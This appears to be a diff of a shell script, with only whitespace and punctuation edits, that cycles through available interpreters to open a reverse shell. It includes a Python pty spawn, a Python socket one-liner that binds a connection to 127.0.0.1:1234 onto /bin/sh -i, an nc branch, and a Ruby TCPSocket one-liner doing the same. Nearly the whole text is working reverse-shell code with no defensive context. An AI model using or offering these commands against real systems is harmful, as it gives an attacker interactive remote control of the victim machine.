@@ -6,12 +6,12 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 if command -v python > /dev/null 2>&1; then
 	python -c 'import socket,subprocess,os; 
-                          sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
-                          sock.connect(("127.0.0.1",1234)); 
-                          os.dup2(sock.fileno(),0); 
-                          os.dup2(sock.fileno(),1); 
-                          os.dup2(sock.fileno(),2);
-		      p = subprocess.call(["/bin/sh","-i"]);'
+                   sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
+                   sock.connect(("127.0.0.1",1234)); 
+                   os.dup2(sock.fileno(),0); 
+                   os.dup2(sock.fileno(),1); 
+                   os.dup2(sock.fileno(),2);
+		   p = subprocess.call(["/bin/sh","-i"]);'
 	exit;
 fi
 
@@ -45,5 +45,5 @@ if command -v nc > /dev/null 2>&1; then
 fi
 
 if command -v ruby > /dev/null 2>&1; then
-	ruby -rsocket -e 'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d 2>&%d",f,f,f)'
+	ruby -rsocket -e 'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d 2>&%d",f,f,f);'
 	exit;
